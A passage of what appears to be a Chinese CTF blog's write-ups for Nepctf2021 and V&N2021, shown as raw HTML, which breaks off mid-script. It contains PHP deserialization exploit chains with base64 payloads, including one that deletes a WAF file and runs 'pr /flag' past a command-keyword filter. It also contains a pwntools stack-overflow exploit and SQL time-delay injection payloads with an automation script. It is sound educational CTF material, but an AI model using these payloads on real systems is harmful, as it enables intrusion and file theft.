operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 目录下必须有 shell.php waf.txt</span></span></code></pre><p>得到payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>读取到<code>shell.php</code>内容</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>就是传入一个命令，过滤一堆读取函数然后长度要小于10并读取flag。</p><p>稍后再研究，那么现在的问题就是进shell函数，然而进shell函数写死了必须要waf.txt不存在。但waf.txt是有的</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>这就为难我胖虎了，思路至此over了。</p><hr><h5 id="删除waf-txt："><a href="#删除waf-txt：" class="headerlink" title="删除waf.txt："></a>删除waf.txt：</h5><p>寻找大佬博客文章，找到了指引思路的<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">文章</a>，2019bytectf的一道web题EzCMS，原题要删除/覆盖目录下<code>.hatccess</code>，刚好本题的login类有漏洞可寻，php手册里查找open的同名函数，利用<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>，其第二个参数里存在能覆盖指定文件的模式，直接删掉<code>waf.txt</code></p><p>于是准备好了phar文件准备‘远程phar’反序列化，但是phar伪协议是不可以远程的</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>孩子比较呆，测了有一会。这里受到了那题固有思维的影响，其实并不需要打phar反序列化的，由login类中checking函数<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>，直接令Game类的file new一个ZipArchive()，filename即为waf.txt，content为模式<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>，也就是9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>测试如下</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>可见waf.txt成功被删除，exp2如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'类同上    '</span><span class="token single-quoted-string string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>成功删除waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="读取flag："><a href="#读取flag：" class="headerlink" title="读取flag："></a>读取flag：</h5><p>ls没过滤，有兴趣可以执行ls看一眼，flag在根目录下</p><p>最后一步，分析shell.php，如何在过滤的情况下读取/flag，搜一圈，找到了linux的命令<code>pr</code></p><blockquote><p><strong>pr命令</strong> 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'  类同上  '</span><span class="token single-quoted-string string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>拿到flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>记录一下，获取类函数名的方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token single-quoted-string string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__call'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token single-quoted-string string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || (str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>反编译出c#代码</p><p>写exp：</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">λ python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>Aes加密网站一波：</p><img src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很有收获，尤其是《简单的php反序列化》，又学到一个新姿势。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N2021公开赛</title>
      <link href="article/VN2021ctf/"/>
      <url>article/VN2021ctf/</url>
      
        <content type="html"><![CDATA[<p>比赛昵称：别答了别答了再答人傻了</p><a id="more"></a><p>比赛情况：</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>孩子太菜了，后面实在不会做了…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>小游戏题上来就改js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>发现游戏关键函数，直接改数据然后<code>Init()</code>,最好疯狂<code>NextLevel()</code>跳到第10关</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>直接从第十关开始，上去撸boss，出flag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>也可以本地保存，直接算js的flag，或者开god模式.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>再不行…后面还发现了个函数…<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hint：我的代码不能注入吧</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>打开登陆界面，第一反应注入，冷静下看数据量很少，拿出祖传20w字典爆破。</p><p>再冷静下测试一下，确认是sql注入</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# ·不报错username&#x3D;\&amp;password&#x3D;&#39; ·报错username&#x3D;\&amp;password&#x3D;&#39;&#39; ·不报错username&#x3D;\&amp;password&#x3D;&#39;# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or # ·500报错username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# ·不报错无延时username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# ·不报错无延时发现没啥用...</code></pre><p>推测后端为：<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>过滤了sleep()可能</p><p>这里没回显的就延时注入，<code>sleep()</code>,<code>Benchmark()</code>,或者笛卡尔积</p><h4 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h4><p>当然延时不精确，count(*)数量大时，费时就高，何况比赛机子<strong>极其不稳定</strong>，不清楚是我卡了还是机器卡了。</p><blockquote><p>笛卡尔积延时注入</p><p>count(*)后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果</p><p>参考之前的WP：<a href="/article/cqb2021">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>甚至数量大了把我数据库给跑崩了…</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机访问</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 不限制超时</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504即为正确</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span 